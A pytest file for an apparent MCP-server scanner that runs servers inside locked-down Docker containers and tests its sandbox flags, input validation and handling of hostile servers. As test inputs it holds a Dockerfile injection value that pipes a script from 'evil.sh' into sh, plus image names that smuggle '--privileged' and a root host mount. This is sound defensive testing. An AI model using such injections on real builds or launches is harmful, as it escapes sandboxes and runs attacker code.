import io
import shutil
import subprocess
import time

import pytest

from agent_perimeter.transport.base import TransportError
from agent_perimeter.transport.stdio import (
    SECCOMP_PROFILE,
    ContainmentError,
    LaunchSpec,
    StdioTransport,
    _bounded_tail,
    docker_args,
    two_phase_dockerfile,
)

_DOCKER_UNAVAILABLE = shutil.which("docker") is None


def test_docker_args_enforce_every_containment_control() -> None:
    args = docker_args(LaunchSpec(image="python:3.12-slim", command=["python", "-c", "pass"]))
    joined = " ".join(args)
    assert "--network none" in joined
    assert "--read-only" in joined
    assert "--user 65534:65534" in joined
    assert "--cap-drop ALL" in joined
    assert "--security-opt no-new-privileges" in joined
    assert "--memory 256m" in joined
    assert "--pids-limit 128" in joined
    assert "--tmpfs /tmp" in joined
    assert "--ulimit nofile" in joined
    assert "HOME=/tmp" in joined
    assert " -v " not in joined, "no host mounts, ever"


def test_docker_default_seccomp_applies_unless_hardened_is_requested() -> None:
    """Docker's own default profile blocks the dangerous set (mount, ptrace,
    bpf, kexec, reboot, keyring calls) and is exercised across every
    architecture. The hand-written allowlist in seccomp.json is missing
    syscalls CPython needs (unlinkat, rt_sigsuspend, restart_syscall,
    membarrier, clock_nanosleep, socketpair, mremap, eventfd2, renameat2,
    ftruncate, getgroups, sched_getparam) and covers only x86_64 — so it is
    opt-in, never the default.
    """
    default = " ".join(docker_args(LaunchSpec(image="i", command=["c"])))
    assert "seccomp=" not in default

    hardened = " ".join(docker_args(LaunchSpec(image="i", command=["c"], hardened_seccomp=True)))
    assert f"seccomp={SECCOMP_PROFILE}" in hardened


def test_allow_network_is_explicit_and_off_by_default() -> None:
    default = " ".join(docker_args(LaunchSpec(image="i", command=["c"])))
    assert "--network none" in default

    permitted = " ".join(docker_args(LaunchSpec(image="i", command=["c"], allow_network=True)))
    assert "--network none" not in permitted


def test_zero_timeout_is_rejected() -> None:
    with pytest.raises(ValueError, match="timeout_s"):
        LaunchSpec(image="i", command=["c"], timeout_s=0)


def test_two_phase_dockerfile_installs_with_network_at_build_time() -> None:
    """npx -y <pkg> and uvx <pkg> both need network on every launch to
    resolve the package. Materialising the install into an image at build
    time — the one step that runs with network — is what lets the actual
    scan run every request with --network none."""
    dockerfile = two_phase_dockerfile(["npm", "install", "-g", "@scope/server"], "node:20-slim")
    assert dockerfile.startswith("FROM node:20-slim\n")
    assert "RUN npm install -g @scope/server" in dockerfile


# --- C2: image cannot smuggle a docker flag ---------------------------------


def test_image_cannot_smuggle_a_docker_flag() -> None:
    """`image` is attacker-influenced (scanned target's repo config/registry
    manifest). It is appended positionally right before `command` with
    nothing marking the end of options, so a leading-dash "image" like
    `--privileged` or `--volume=/:/host` would be parsed as a docker flag,
    not the image, unwinding the whole sandbox."""
    with pytest.raises(ValueError, match="image"):
        LaunchSpec(image="--privileged", command=["c"])
    with pytest.raises(ValueError, match="image"):
        LaunchSpec(image="--volume=/:/host", command=["c"])


def test_docker_args_never_emits_privileged_for_any_valid_spec() -> None:
    args = docker_args(LaunchSpec(image="python:3.12-slim", command=["python", "-c", "pass"]))
    assert "--privileged" not in args


def test_two_phase_dockerfile_rejects_base_image_injection() -> None:
    """`base_image` is interpolated raw (`FROM {base_image}`) while
    `install_command` is shlex-quoted; a newline in `base_image` injects
    arbitrary Dockerfile directives that `docker build` runs as root with
    network access (I5)."""
    with pytest.raises(ValueError, match="base_image"):
        two_phase_dockerfile(["npm", "install"], "node:20-slim\nRUN curl evil.sh | sh")


# --- Fix round 2: New-1, a bounded stderr-tail read -------------------------


def test_bounded_tail_never_reads_past_its_limit() -> None:
    """New-1: the stderr excerpt embedded in an error message must come
    from a bounded `read(limit)`, not a `read()[:limit]` slice — the
    latter materializes the *entire* (attacker-inflated) stream in host
    memory just to keep a 400-char tail, which a hostile server can scale
    to a host OOM. A stream position left at exactly `limit` after the
    call proves the rest of a 10 MiB payload was never touched."""
    huge = io.StringIO("x" * (10 * 1024 * 1024))
    tail = _bounded_tail(huge, limit=400)
    assert len(tail) == 400
    assert huge.tell() == 400


# --- Docker-dependent tests --------------------------------------------------

_COUNTING_SERVER = (
    "import json, sys\n"
    "count = 0\n"
    "for line in sys.stdin:\n"
    "    if not line.strip():\n"
    "        continue\n"
    "    count += 1\n"
    "    msg = json.loads(line)\n"
    "    reply = {'jsonrpc': '2.0', 'id': msg.get('id'), 'result': {'count': count}}\n"
    "    print(json.dumps(reply), flush=True)\n"
)


@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
def test_one_container_serves_a_multi_request_sequence() -> None:
    """The container is not restarted between calls, so state accumulates —
    exactly what a server-minted handle needs to survive across requests."""
    transport = StdioTransport(
        LaunchSpec(image="python:3.12-slim", command=["python3", "-c", _COUNTING_SERVER])
    )
    try:
        first = transport.request("ping")
        second = transport.request("ping")
        third = transport.request("ping")
    finally:
        transport.close()

    assert (first["count"], second["count"], third["count"]) == (1, 2, 3)


@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
def test_hard_timeout_actually_kills_the_container() -> None:
    """C1: a hostile server that never reads stdin must not survive the
    deadline just because the local `docker run` CLI client was killed —
    the daemon owns the container independently of that client process.
    Verified against the live daemon, not just the raised exception."""
    transport = StdioTransport(
        LaunchSpec(
            image="python:3.12-slim",
            command=["python3", "-c", "import time; time.sleep(600)"],
            timeout_s=2,
        )
    )
    name = transport.container_name
    try:
        with pytest.raises(ContainmentError):
            transport.request("ping")
    finally:
        transport.close()

    deadline = time.monotonic() + 20
    still_running = True
    while time.monotonic() < deadline:
        out = subprocess.run(
            ["docker", "ps", "-q", "--filter", f"name={name}"],
            capture_output=True,
            text=True,
            check=True,
        ).stdout.strip()
        if not out:
            still_running = False
            break
        time.sleep(0.5)

    assert not still_running, f"container {name} is still running after the hard timeout"


_STDERR_FLOODING_SERVER = (
    "import json, sys\n"
    "sys.stderr.write('x' * 200000)\n"
    "sys.stderr.flush()\n"
    "for line in sys.stdin:\n"
    "    if not line.strip():\n"
    "        continue\n"
    "    msg = json.loads(line)\n"
    "    reply = {'jsonrpc': '2.0', 'id': msg.get('id'), 'result': {'ok': True}}\n"
    "    print(json.dumps(reply), flush=True)\n"
)


@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
def test_stderr_flood_does_not_deadlock_the_scan() -> None:
    """I1: a normal MCP server logging to stderr (per convention) must not
    wedge the scan once a piped stderr's OS buffer (~64KB) fills."""
    transport = StdioTransport(
        LaunchSpec(
            image="python:3.12-slim",
            command=["python3", "-c", _STDERR_FLOODING_SERVER],
            timeout_s=15,
        )
    )
    try:
        result = transport.request("ping")
    finally:
        transport.close()
    assert result == {"ok": True}


_NOTIFYING_SERVER = (
    "import json, sys\n"
    "for line in sys.stdin:\n"
    "    if not line.strip():\n"
    "        continue\n"
    "    msg = json.loads(line)\n"
    "    notice = {'jsonrpc': '2.0', 'method': 'progress', 'params': {}}\n"
    "    print(json.dumps(notice), flush=True)\n"
    "    reply = {'jsonrpc': '2.0', 'id': msg.get('id'), 'result': {'echo': msg.get('id')}}\n"
    "    print(json.dumps(reply), flush=True)\n"
)


@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
def test_request_ignores_unmatched_messages_and_finds_its_response() -> None:
    """I2: a stray notification/progress message with no matching `id` must
    not be mistaken for the response to this specific request — a hostile
    server could otherwise suppress a finding by feeding a stale answer."""
    transport = StdioTransport(
        LaunchSpec(image="python:3.12-slim", command=["python3", "-c", _NOTIFYING_SERVER])
    )
    try:
        result = transport.request("ping")
    finally:
        transport.close()
    assert result == {"echo": 1}


_ID_NULL_ERROR_SERVER = (
    "import json, sys\n"
    "for line in sys.stdin:\n"
    "    if not line.strip():\n"
    "        continue\n"
    "    reply = {\n"
    "        'jsonrpc': '2.0',\n"
    "        'id': None,\n"
    "        'error': {'code': -32601, 'message': 'Method not found'},\n"
    "    }\n"
    "    print(json.dumps(reply), flush=True)\n"
)


@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
def test_id_null_error_frame_surfaces_immediately_not_discarded() -> None:
    """New-2: JSON-RPC 2.0 mandates `id: null` on an error when the server
    couldn't determine the request id — a legitimate response shape that
    the id-correlation check must never silently discard. Discarding it
    would burn the whole scan's wall-clock budget waiting for a match that
    never comes, and lose the error `code` Task 8 depends on."""
    transport = StdioTransport(
        LaunchSpec(
            image="python:3.12-slim",
            command=["python3", "-c", _ID_NULL_ERROR_SERVER],
            timeout_s=30,
        )
    )
    started = time.monotonic()
    try:
        with pytest.raises(TransportError) as exc_info:
            transport.request("ping")
    finally:
        transport.close()
    elapsed = time.monotonic() - started

    assert not isinstance(exc_info.value, ContainmentError)
    assert exc_info.value.code == -32601
    assert elapsed < 10, "must surface immediately, not after the wall-clock deadline"


_GARBAGE_SERVER = (
    "import sys\n"
    "for line in sys.stdin:\n"
    "    if not line.strip():\n"
    "        continue\n"
    "    print('not-json{{{', flush=True)\n"
)


@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
def test_malformed_json_response_raises_transport_error_not_crash() -> None:
    """I3: unparsable stdout must surface as TransportError, not an
    unhandled JSONDecodeError."""
    transport = StdioTransport(
        LaunchSpec(image="python:3.12-slim", command=["python3", "-c", _GARBAGE_SERVER])
    )
    try:
        with pytest.raises(TransportError):
            transport.request("ping")
    finally:
        transport.close()


_NULL_RESPONSE_SERVER = (
    "import sys\n"
    "for line in sys.stdin:\n"
    "    if not line.strip():\n"
    "        continue\n"
    "    print('null', flush=True)\n"
)


@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
def test_non_object_json_response_raises_transport_error() -> None:
    """I3: a bare JSON scalar (e.g. `null`) must not reach `"error" in
    message` unguarded — that raises TypeError on a non-dict."""
    transport = StdioTransport(
        LaunchSpec(image="python:3.12-slim", command=["python3", "-c", _NULL_RESPONSE_SERVER])
    )
    try:
        with pytest.raises(TransportError):
            transport.request("ping")
    finally:
        transport.close()


_UNBOUNDED_LINE_SERVER = (
    "import sys\n"
    "sys.stdin.readline()\n"
    "sys.stdout.write('x' * (2 * 1024 * 1024))\n"
    "sys.stdout.flush()\n"
    "import time\n"
    "time.sleep(60)\n"
)


@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
def test_unbounded_response_line_is_capped_not_buffered_forever() -> None:
    """I4: a newline-free flood on stdout must hit a bound rather than
    growing the host scanner process's memory without limit.

    `ContainmentError` is a `TransportError` subclass, so asserting only
    `TransportError` here would pass identically whether the 512 KiB line
    cap fired or the (10s) wall-clock deadline fired instead — it wouldn't
    prove the cap did its job. Match the cap's specific message and rule
    out `ContainmentError` so this only passes when the cap — not the
    deadline — is what stopped it (it fires in ~2s, well under the 10s
    budget)."""
    transport = StdioTransport(
        LaunchSpec(
            image="python:3.12-slim",
            command=["python3", "-c", _UNBOUNDED_LINE_SERVER],
            timeout_s=10,
        )
    )
    try:
        with pytest.raises(TransportError, match="bytes without a newline") as exc_info:
            transport.request("ping")
    finally:
        transport.close()
    assert not isinstance(exc_info.value, ContainmentError)
